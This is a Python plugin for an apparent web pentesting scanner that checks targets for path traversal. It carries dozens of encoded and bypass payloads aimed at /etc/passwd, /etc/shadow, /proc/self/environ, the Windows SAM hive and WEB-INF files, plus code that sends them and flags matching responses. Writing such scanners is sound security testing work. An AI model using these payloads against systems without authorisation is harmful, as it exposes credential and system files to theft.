"""Path Traversal / Directory Traversal vulnerability detection."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

TRAVERSAL_PAYLOADS = [
    # Basic traversal — Unix
    ("../../../etc/passwd", "root:"),
    ("../../../../etc/passwd", "root:"),
    ("../../../../../etc/passwd", "root:"),
    ("../../../../../../etc/passwd", "root:"),
    # Double slash bypass
    ("....//....//....//etc/passwd", "root:"),
    ("....//....//....//....//etc/passwd", "root:"),
    # Single URL encoding
    ("..%2f..%2f..%2fetc%2fpasswd", "root:"),
    ("..%2f..%2f..%2f..%2fetc%2fpasswd", "root:"),
    # Double URL encoding
    ("..%252f..%252f..%252fetc%252fpasswd", "root:"),
    ("%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "root:"),
    ("..%252e..%252e..%252eetc/passwd", "root:"),
    # Backslash variants — Windows
    ("..\\..\\..\\windows\\win.ini", "[fonts]"),
    ("..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
    ("....\\\\....\\\\....\\\\windows\\\\win.ini", "[fonts]"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]"),
    ("..%255c..%255c..%255cwindows%255cwin.ini", "[fonts]"),
    # Mixed encoding
    ("..%c0%af..%c0%af..%c0%afetc/passwd", "root:"),
    ("..%c0%ae..%c0%ae/..%c0%ae..%c0%ae/etc/passwd", "root:"),
    # UTF-8 overlong encoding
    ("%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "root:"),
    ("%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd", "root:"),
    # Fullwidth encoding
    ("..%ef%bc%8f..%ef%bc%8fetc/passwd", "root:"),
    # Absolute paths
    ("/etc/passwd", "root:"),
    ("/etc/shadow", "root:"),
    ("/etc/hosts", "localhost"),
    ("/proc/self/environ", "PATH="),
    ("/proc/version", "Linux version"),
    ("C:\\Windows\\win.ini", "[fonts]"),
    ("C:\\boot.ini", "[boot loader]"),
    ("C:\\Windows\\System32\\drivers\\etc\\hosts", "localhost"),
    # file:// protocol
    ("file:///etc/passwd", "root:"),
    ("file:///etc/shadow", "root:"),
    ("file:///proc/self/environ", "PATH="),
    # Null byte injection
    ("..%00/etc/passwd", "root:"),
    ("..%00\\windows\\win.ini", "[fonts]"),
    ("../../../etc/passwd%00.jpg", "root:"),
    ("../../../etc/passwd%00.html", "root:"),
    ("../../../etc/passwd%00.png", "root:"),
    # Truncation / double-dot variants
    ("....////....////....////etc/passwd", "root:"),
    ("..../....//....//etc/passwd", "root:"),
    ("..///////../////..//////etc/passwd", "root:"),
    # Dot-encoding
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:"),
    ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", "root:"),
    # IIS-specific / semicolon bypass
    ("..;/..;/..;/etc/passwd", "root:"),
    ("/..;/..;/..;/etc/passwd", "root:"),
    ("..;\\..;\\..;\\windows\\win.ini", "[fonts]"),
    # Tomcat-specific
    ("/..;/etc/passwd", "root:"),
    ("/..;/..;/etc/passwd", "root:"),
    # Unicode bypass
    ("..%u2216..%u2216etc/passwd", "root:"),
    ("..%u2215..%u2215..%u2215etc/passwd", "root:"),
    # Reverse path separator
    ("\\\\..\\\\..\\\\..\\\\etc\\\\passwd", "root:"),
    # Java-specific target files
    ("WEB-INF/web.xml", "<web-app"),
    ("WEB-INF/web.xml", "servlet"),
    ("META-INF/MANIFEST.MF", "Manifest-Version"),
    ("WEB-INF/classes/application.properties", "spring"),
    # Nginx alias bypass
    ("../etc/passwd", "root:"),
    ("..\\/etc/passwd", "root:"),
    # Combo (Nginx path normalization)
    ("/..../..../..../etc/passwd", "root:"),
    ("/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "root:"),
    # /proc filesystem targets
    ("/proc/self/cmdline", "python"),
    ("/proc/self/status", "Name:"),
    ("../../../proc/self/environ", "PATH="),
    # Additional Windows targets
    ("..\\..\\..\\..\\Windows\\System32\\config\\SAM", "regf"),
]

TRAVERSAL_PARAMS = [
    "file", "path", "page", "document", "folder", "dir",
    "img", "image", "include", "template", "content",
    "download", "filepath", "filename", "loc", "location",
    "src", "dest", "redirect", "uri", "resource",
    "data", "conf", "cfg", "backup", "log",
    "pic", "attachment", "readfile", "load", "read",
    "open", "cat", "view", "fetch", "retrieve",
]

SCAN_PAGES = [
    "/", "/download", "/file", "/read",
    "/view", "/include", "/page", "/load",
]

PATH_BASED_CHECKS = [
    # Static directory breakout
    ("/static/../../../../etc/passwd", "root:"),
    ("/static/..%2f..%2f..%2f..%2fetc/passwd", "root:"),
    ("/assets/..%2f..%2f..%2f..%2fetc/passwd", "root:"),
    ("/img/..%2f..%2f..%2f..%2fetc/passwd", "root:"),
    ("/css/../../../etc/passwd", "root:"),
    ("/js/..%5c..%5c..%5c..%5cwindows/win.ini", "[fonts]"),
    # Download parameter in path
    ("/download?file=../../../../etc/passwd", "root:"),
    ("/download?file=....//....//....//etc/passwd", "root:"),
    # IIS / Tomcat semicolon bypass
    ("/static/..;/..;/..;/..;/etc/passwd", "root:"),
    ("/images/..;/..;/..;/etc/passwd", "root:"),
    # Double encoding in path
    ("/static/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "root:"),
    ("/assets/%252e%252e/%252e%252e/%252e%252e/etc/passwd", "root:"),
    # Java web app files
    ("/WEB-INF/web.xml", "<web-app"),
    ("/META-INF/MANIFEST.MF", "Manifest-Version"),
    ("/WEB-INF/classes/application.properties", "spring"),
    # Nginx alias misconfiguration
    ("/uploads../etc/passwd", "root:"),
    ("/files../etc/passwd", "root:"),
    # UTF-8 overlong in path
    ("/static/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "root:"),
    # Windows targets via path
    ("/static/..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
]


class PathTraversalPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="path_traversal",
        display_name="Path Traversal Check",
        category=PluginCategory.PENTESTING,
        description="Checks for directory/path traversal vulnerabilities",
        produces=["path_traversal_findings"],
        timeout=60.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host,
                error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url
        from basilisk.utils.injection_points import collect_injection_points

        findings: list[Finding] = []
        confirmed: list[dict] = []
        tested_count = 0

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"traversal_tests": [], "tested_count": 0},
            )

        # Phase 1: parameter-based traversal via injection points
        inj_points = collect_injection_points(
            target.host, ctx,
            hardcoded_paths=SCAN_PAGES,
            hardcoded_params=TRAVERSAL_PARAMS,
            param_filter=TRAVERSAL_PARAMS,
            max_points=30,
        )

        for point in inj_points:
            if ctx.should_stop or len(findings) >= 5:
                break
            for param in point.params:
                if ctx.should_stop or len(findings) >= 5:
                    break
                for payload, indicator in TRAVERSAL_PAYLOADS:
                    url = point.build_url(base_url, param, payload)
                    tested_count += 1
                    try:
                        async with ctx.rate:
                            resp = await ctx.http.get(
                                url, timeout=8.0,
                            )
                            body = await resp.text(
                                encoding="utf-8", errors="replace",
                            )

                            if indicator in body:
                                confirmed.append({
                                    "type": "parameter",
                                    "page": point.path,
                                    "param": param,
                                    "payload": payload,
                                    "indicator": indicator,
                                    "url": url,
                                })
                                findings.append(Finding.critical(
                                    f"Path traversal via "
                                    f"{point.path}?{param}=",
                                    description=(
                                        f"Server returns local file "
                                        f"content with payload: "
                                        f"{payload}"
                                    ),
                                    evidence=(
                                        f"Response contains: "
                                        f"{indicator}"
                                    ),
                                    remediation=(
                                        "Sanitize user input. Never "
                                        "use raw parameters in file "
                                        "paths. Use a whitelist of "
                                        "allowed files or an ID-based "
                                        "lookup instead."
                                    ),
                                    tags=[
                                        "pentesting",
                                        "path-traversal",
                                    ],
                                ))
                                break
                    except Exception as e:
                        logger.debug("path_traversal: %s", e)
                        continue

        # Phase 2: path-based traversal
        for path_suffix, indicator in PATH_BASED_CHECKS:
            url = f"{base_url}{path_suffix}"
            tested_count += 1
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(url, timeout=8.0)
                    body = await resp.text(
                        encoding="utf-8", errors="replace",
                    )

                    if indicator in body:
                        confirmed.append({
                            "type": "path",
                            "path": path_suffix,
                            "indicator": indicator,
                            "url": url,
                        })
                        findings.append(Finding.critical(
                            f"Path-based traversal: "
                            f"{path_suffix}",
                            description=(
                                "Server resolves traversal "
                                "sequences in URL path"
                            ),
                            evidence=(
                                f"Response contains: {indicator}"
                            ),
                            remediation=(
                                "Configure the web server to "
                                "reject path traversal sequences. "
                                "Use realpath validation before "
                                "serving static files."
                            ),
                            tags=["pentesting", "path-traversal"],
                        ))
            except Exception as e:
                logger.debug("path_traversal: %s", e)
                continue

        if not findings:
            findings.append(Finding.info(
                "No path traversal vulnerabilities detected",
                description=(
                    f"Tested {tested_count} combinations "
                    f"across {len(SCAN_PAGES)} pages"
                ),
                tags=["pentesting", "path-traversal"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={
                "traversal_tests": confirmed,
                "tested_count": tested_count,
            },
        )
